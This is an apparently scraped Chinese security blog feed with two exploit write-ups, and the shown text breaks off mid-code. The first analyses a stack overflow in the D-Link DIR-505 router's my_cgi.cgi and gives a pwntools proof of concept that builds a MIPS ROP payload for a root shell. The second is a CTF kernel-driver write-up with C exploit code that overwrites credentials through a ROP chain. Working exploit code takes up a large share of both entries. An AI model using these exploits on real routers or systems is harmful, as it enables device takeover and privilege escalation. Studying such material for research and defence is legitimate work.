        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>Link DIR-505路由器是一款便携式无线路由器，但在该路由器的“my_cgi.cgi”的CGI脚本中，存在缓冲区溢出的漏洞。造成漏洞的原因并不是常见的危险函数将大缓冲区复制到小缓冲区造成溢出，而是在目的缓冲区和源缓冲区之间以字节为单位循环赋值转储时，对边界验证不合理导致程序越界访问源缓冲区，最终造成缓冲区溢出。溢出发生后，攻击者可以获取路由器远程控制权。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据漏洞描述直接分析对应的my_cgi.cgi文件：漏洞在于处理POST参数中storage_path参数的值时发生了缓冲区溢出。<br>在对storage_path八处调用中有一个get_input_entries函数，先看看这个函数。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/22/d-link-dir-505-yue-jie-lou-dong-fen-xi/0.png"></div><p>首先我们看到第一个参数传入的是栈地址，第二个参数则是获取的content_length的值。现在我们进入该函数：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> length <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token constant">stdin</span><span class="token operator">-></span>_fileno <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      write_base <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token operator">-></span>_IO_write_base<span class="token punctuation">;</span>      v8 <span class="token operator">=</span> write_base <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> write_base <span class="token operator">&lt;</span> <span class="token constant">stdin</span><span class="token operator">-></span>_IO_write_end <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v9 <span class="token operator">=</span> <span class="token operator">*</span>write_base<span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">// 获取一个字符地址</span>        <span class="token constant">stdin</span><span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> v8<span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>_fgetc_unlocked<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      v10 <span class="token operator">=</span> <span class="token operator">&amp;</span>fgetc<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 调用getc函数给v9</span>LABEL_8<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">==</span> <span class="token string">'='</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v11 <span class="token operator">=</span> <span class="token number">0x425</span> <span class="token operator">*</span> v4<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v6 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_17<span class="token punctuation">;</span>      <span class="token punctuation">}</span>LABEL_15<span class="token punctuation">:</span>      v6 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stack_addr <span class="token operator">+</span> v11 <span class="token operator">+</span> v5 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_16<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">==</span> <span class="token string">'&amp;'</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">++</span>v4<span class="token punctuation">;</span>      v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_17<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v11 <span class="token operator">=</span> <span class="token number">0x425</span> <span class="token operator">*</span> v4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stack_addr <span class="token operator">+</span> v11 <span class="token operator">+</span> v5<span class="token punctuation">)</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>LABEL_16<span class="token punctuation">:</span>    <span class="token operator">++</span>v5<span class="token punctuation">;</span>LABEL_17<span class="token punctuation">:</span>    <span class="token operator">--</span>length<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码大概能看懂是对传入的栈地址，根据length大小进行赋值。那么length没有检查，如果大于栈的buffer，那么就会造成栈溢出了。</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>测试溢出：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/22/d-link-dir-505-yue-jie-lou-dong-fen-xi/1.png"></div><p>查看溢出位置：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/22/d-link-dir-505-yue-jie-lou-dong-fen-xi/2.png"></div><p>得到ret偏移为：477456+16 = 477472</p><p>拿shell的方式和之前的一样</p><p>调试过程中遇到一个比较神奇的事情，当情况a1寄存器，也就是调用函数的第二个参数的时候。这时调用函数时会将寄存器s5的值给到a0（也就是调用函数的第一个参数）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/22/d-link-dir-505-yue-jie-lou-dong-fen-xi/3.png"></div><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">"big"</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"mips"</span>libc_base <span class="token operator">=</span> <span class="token number">0x7f6d0000</span>execve <span class="token operator">=</span> <span class="token number">0xb0a0</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x54aa8</span>system <span class="token operator">=</span> <span class="token number">0x4bc80</span>magic1 <span class="token operator">=</span> <span class="token number">0x4f3b0</span><span class="token comment" spellcheck="true"># LOAD:0004F3B0 move    $a0, $s1</span><span class="token comment" spellcheck="true"># LOAD:0004F3B4 move    $t9, $s4</span><span class="token comment" spellcheck="true"># LOAD:0004F3B8 jalr    $t9 ; f</span>magic2 <span class="token operator">=</span> <span class="token number">0x0047834</span><span class="token comment" spellcheck="true"># LOAD:00047834 move    $a1, $v0</span><span class="token comment" spellcheck="true"># LOAD:00047838 move    $t9, $s3</span><span class="token comment" spellcheck="true"># LOAD:0004783C jalr  </span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">477456</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 477472-36</span>payload<span class="token operator">+=</span> <span class="token string">"abcd"</span>  <span class="token comment" spellcheck="true"># s0</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># s1</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># s2</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>execve<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># s3</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>magic2<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># s4</span><span class="token comment" spellcheck="true"># payload+= p32(binsh_addr+libc_base)  # s5</span>payload<span class="token operator">+=</span> <span class="token string">"fuck"</span>payload<span class="token operator">+=</span> <span class="token string">"/sh;"</span>  <span class="token comment" spellcheck="true"># s6</span>payload<span class="token operator">+=</span> <span class="token string">"mnop"</span>  <span class="token comment" spellcheck="true"># s7</span>payload<span class="token operator">+=</span> <span class="token string">"qrst"</span>  <span class="token comment" spellcheck="true"># fp</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>magic1<span class="token operator">+</span>libc_base<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ra</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 从0学习路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020祥云杯-babydev</title>
      <link href="/2021/01/21/2020-xiang-yun-bei-babydev/"/>
      <url>/2021/01/21/2020-xiang-yun-bei-babydev/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p>查看保护机制：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/21/2020-xiang-yun-bei-babydev/0.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/21/2020-xiang-yun-bei-babydev/1.png"></div><p>之前一直想复现一下这道题，当时没找到洞在哪。</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>首先了解这么几个参数：</p><p>文件的读写指针，规定write和read的位置；<br>文件的头指针，指向文件内容开始的地方，它存放在mydata+0x10000中，表示文件内容的起始地址相对于mydata的偏移；<br>三是文件的大小，它存放在mydata+0x10008中。</p><p>除此之外我们需要了解文件结构体：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> file <span class="token punctuation">{</span>        <span class="token keyword">union</span> <span class="token punctuation">{</span>                <span class="token keyword">struct</span> llist_node  fu_llist<span class="token punctuation">;</span>                <span class="token keyword">struct</span> rcu_head      fu_rcuhead<span class="token punctuation">;</span>        <span class="token punctuation">}</span> f_u<span class="token punctuation">;</span>        <span class="token keyword">struct</span> path              f_path<span class="token punctuation">;</span>        <span class="token keyword">struct</span> inode            <span class="token operator">*</span>f_inode<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* cached value */</span>        <span class="token keyword">const</span> <span class="token keyword">struct</span> file_operations       <span class="token operator">*</span>f_op<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*     * Protects f_ep_links, f_flags.     * Must not be taken from IRQ context.     */</span>        spinlock_t            f_lock<span class="token punctuation">;</span>        <span class="token keyword">enum</span> rw_hint          f_write_hint<span class="token punctuation">;</span>        atomic_long_t              f_count<span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span>                f_flags<span class="token punctuation">;</span>        fmode_t                  f_mode<span class="token punctuation">;</span>        <span class="token keyword">struct</span> mutex            f_pos_lock<span class="token punctuation">;</span>        loff_t                    f_pos<span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 偏移 0x68 这也就是后面的一个功能可以对这个值控制</span>        <span class="token keyword">struct</span> fown_struct        f_owner<span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token keyword">struct</span> cred     <span class="token operator">*</span>f_cred<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 这里指向当前进程的cred结构体，偏移0x90</span>        <span class="token keyword">struct</span> file_ra_state    f_ra<span class="token punctuation">;</span>        u64                  f_version<span class="token punctuation">;</span>#ifdef CONFIG_SECURITY        <span class="token keyword">void</span>                      <span class="token operator">*</span>f_security<span class="token punctuation">;</span>#endif        <span class="token comment" spellcheck="true">/* needed for tty driver, and maybe others */</span>        <span class="token keyword">void</span>                      <span class="token operator">*</span>private_data<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> CONFIG_EPOLL</span>        <span class="token comment" spellcheck="true">/* Used by fs/eventpoll.c to link all the hooks to this file */</span>        <span class="token keyword">struct</span> list_head    f_ep_links<span class="token punctuation">;</span>        <span class="token keyword">struct</span> list_head    f_tfile_llink<span class="token punctuation">;</span>#endif <span class="token comment" spellcheck="true">/* #ifdef CONFIG_EPOLL */</span>        <span class="token keyword">struct</span> address_space    <span class="token operator">*</span>f_mapping<span class="token punctuation">;</span>        errseq_t                f_wb_err<span class="token punctuation">;</span>        errseq_t                f_sb_err<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* for syncfs */</span><span class="token punctuation">}</span> __randomize_layout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要有这几个功能</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/21/2020-xiang-yun-bei-babydev/2.png"></div><p>接下来一个一个的进行分析：</p><p> <strong>mychrdev_unlocked_ioctl</strong></p><p>拷贝对应的 struct file 结构体 0xc8 位置的指针指向的内容（前0x28字节）到用户空间。可以泄露堆栈地址信息。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/21/2020-xiang-yun-bei-babydev/3.png"></div><p><strong>write</strong></p><p>write每向 off + *(mydata+0x10000) + mydata 进行写操作，内容为用户空间传过去的值。同时 *(mydata + 0x10008) 处的值增大。</p><p>其实这个off = file-&gt;f_pos</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/21/2020-xiang-yun-bei-babydev/4.png"></div><p>我们看看write函数执行的检查：</p><p>第⼀个if判断，off⼤于0xffff和off⼤于等于已写⼊的总字符数同时成⽴时，才会返 回； 第⼆个if判断，⽤来更新n的值；如果off+n(要写⼊的字符数)的和⼤于0x10000 时，则对n重新赋值，n=0x10000-off。</p><p>可以发现，如果off的值大于0x10000时，在第⼆个if判断时，就会是 n=0x10000-0x10001，就会使得n的值发⽣整数溢出(强制转换(unsigned __int16))，就可以越界写。 那么，off能否取值为0x10001呢？可以⾸先使得* (_QWORD *)(mydata + 0x10008) )的值很⼤，这样，即使off&gt;0xffff了，也可以通过第⼀个if的check。 如此⼀来，就可以对mydata+0x10001处的值进⾏写⼊了，配合控制off的值，就可以达到任意地址写的效果，同样的也就完成了任意地址读的目的。</p><p><strong>read</strong></p><p>file-&gt;f_pos + have_use + mydata 处的内容传给用户空间。</p><p><strong>llseek</strong></p><p>llseek用来同过设置 file-&gt;f_ops 设置 write() 和 read() 读写的位置。也就是设置read和write的第四个参数指针的值</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/21/2020-xiang-yun-bei-babydev/5.png"></div><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>思路有三种：</p><h2 id="1-第一种是直接任意地址写来改栈上的返回地址为rop拿shell"><a href="#1-第一种是直接任意地址写来改栈上的返回地址为rop拿shell" class="headerlink" title="1.第一种是直接任意地址写来改栈上的返回地址为rop拿shell"></a>1.第一种是直接任意地址写来改栈上的返回地址为rop拿shell</h2><p>1:通过ioctl(fd,0x1111,stack)来leak内核栈、堆的地址信息；<br>2:通过write-lseek-write的操作增⼤写⼊的总字节数(*(_QWORD *)(mydata + 0x10008))，超出0x10000的范围，使得write函数第⼀个if判断，即使off的值 是⼤于0xffff的，依然可以继续执⾏。<br>3:通过lseek设置off=0x10001，然后write，由于off+n要⼤于0x10000，所 以会重新计算n=0x10000-0x10001，由于后⾯类型的转换为⽆符号数， n=0xffff，可以溢出写mydata+0x10000处的值。<br>4:可以控制mydata+0x10000、off的值，已知mydata的基地址，就可以实 现任意地址写了；由于已知栈的地址，所以选择劫持ret。<br>5:通过write在ret处写⼊rop提权数据，完成提权。这⾥rop提权师傅们已经 将得很详细了，就不再过多阐述。</p><h2 id="2-第二种是爆破得到file结构体地址，根据file结构体得到cred地址去修改cred值"><a href="#2-第二种是爆破得到file结构体地址，根据file结构体得到cred地址去修改cred值" class="headerlink" title="2.第二种是爆破得到file结构体地址，根据file结构体得到cred地址去修改cred值"></a>2.第二种是爆破得到file结构体地址，根据file结构体得到cred地址去修改cred值</h2><p>1.控制地址写的位置的主要是：file-&gt;f_pos（以下简称llseek）、以及 *(mydata+0x10000) 处存储的值。<br>2.通过多次的 write 配合 lseek，可以实现将 (mydata+0x10008) 一直增大，配合lseek，触发在write 函数中的一个溢出，可以实现对于 (mydata+0x10000) 和 *(mydata+0x10008) 这两个关键位置的劫持。<br>3.劫持 (mydata+0x10000) 和 (mydata+0x10008) 后，配合read函数进行任意地址读，爆破 file 结构体的地址，读取0x98大小，最后8个字节即为 file-&gt;f_cred 指向当前进程的 cred 结构体。<br>4.通过计算偏移，重新设置 lseek 和 *(mydata+0x10000) ，配合write函数做任意地址写，目标地址为我们爆破出的 cred 结构体的地址。<br>5.将当前进程的cred结构体前0x28写成全0，达到提权的目的。</p><h2 id="3-爆破字符串得到cred地址，修改cred的值"><a href="#3-爆破字符串得到cred地址，修改cred的值" class="headerlink" title="3.爆破字符串得到cred地址，修改cred的值"></a>3.爆破字符串得到cred地址，修改cred的值</h2><p>与上面getshell方式类似，只是得到cred地址方式不同。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token comment" spellcheck="true">//这⾥提供类型pid_t和size_t的定义 open</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token comment" spellcheck="true">//ioctl</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span> </span><span class="token comment" spellcheck="true">/* System V */</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span> </span><span class="token comment" spellcheck="true">/* BSD and Linux */</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stropts.h></span> </span><span class="token comment" spellcheck="true">/* XSI STREAMS */</span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token comment" spellcheck="true">//gcc -static ./exp.c -o exp</span><span class="token macro property">#<span class="token directive keyword">define</span> pop_rdi_ret 0xffffffff813ead2c</span><span class="token macro property">#<span class="token directive keyword">define</span> xchg_rax_rdi_ret 0xffffffff81768ef2</span><span class="token macro property">#<span class="token directive keyword">define</span> prepare_kernel_cred 0xffffffff8108d690</span><span class="token macro property">#<span class="token directive keyword">define</span> commit_creds 0xffffffff8108d340</span><span class="token macro property">#<span class="token directive keyword">define</span> swapgs_fq_bp_ret 0xffffffff81c00eae</span><span class="token macro property">#<span class="token directive keyword">define</span> iretq 0xffffffff81025a56</span>size_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags <span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">asm</span><span class="token punctuation">(</span> <span class="token string">"movq %%cs, %0\n"</span> <span class="token string">"movq %%ss, %1\n"</span> <span class="token string">"movq %%rsp, %3\n"</span> <span class="token string">"pushfq\n"</span> <span class="token string">"popq %2\n"</span> <span class="token punctuation">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hget root\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x20000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    size_t stack<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x1111</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t stack_data <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"stack_data is %p\n"</span><span class="token punctuation">,</span>stack_data<span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t temp<span class="token operator">=</span><span class="token number">0xffffffff</span><span class="token punctuation">;</span>    size_t base<span class="token operator">=</span><span class="token number">0xffffc90000000000</span><span class="token punctuation">;</span>    size_t stack_base <span class="token operator">=</span> <span class="token punctuation">(</span>stack_data<span class="token operator">&amp;</span>temp<span class="token punctuation">)</span><span class="token operator">|</span>base<span class="token punctuation">;</span>    size_t mydata <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"stack==> %p\n"</span><span class="token punctuation">,</span>stack_base<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mydata==> %p\n"</span><span class="token punctuation">,</span>mydata<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span><span class="token number">0xf000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span><span class="token number">0xf000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t stack_target <span class="token operator">=</span> stack_base <span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">;</span>    size_t stack_base_00 <span class="token operator">=</span> stack_target <span class="token operator">&amp;</span> <span class="token number">0xffffffffffffff00</span><span class="token punctuation">;</span>    size_t stack_offset <span class="token operator">=</span> stack_target <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x10001</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t offset <span class="token operator">=</span> <span class="token punctuation">(</span>stack_base_00 <span class="token operator">-</span> mydata<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token operator">&amp;</span>offset<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>stack_offset<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t rop<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>pop_rdi_ret<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>xchg_rax_rdi_ret<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span>    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span 